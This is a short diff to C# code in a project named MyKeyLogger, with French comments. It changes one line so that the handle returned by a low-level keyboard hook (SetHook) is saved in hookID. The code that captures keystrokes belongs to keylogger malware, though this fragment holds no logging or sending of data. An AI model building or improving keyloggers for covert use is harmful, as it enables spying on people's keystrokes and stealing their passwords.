@@ -236,7 +236,7 @@ namespace MyKeyLogger
             //OperationKey.TurnOFFCapsLockKey();
             
             // Defnit une fonction de rappel qui sera appelée à chaque pression de touche.
-            SetHook(proc);
+            hookID = SetHook(proc);
             
             // Permet au formulaire de recevoir des messages Windows (des pressions sur des touches claviers) 
             Application.Run();
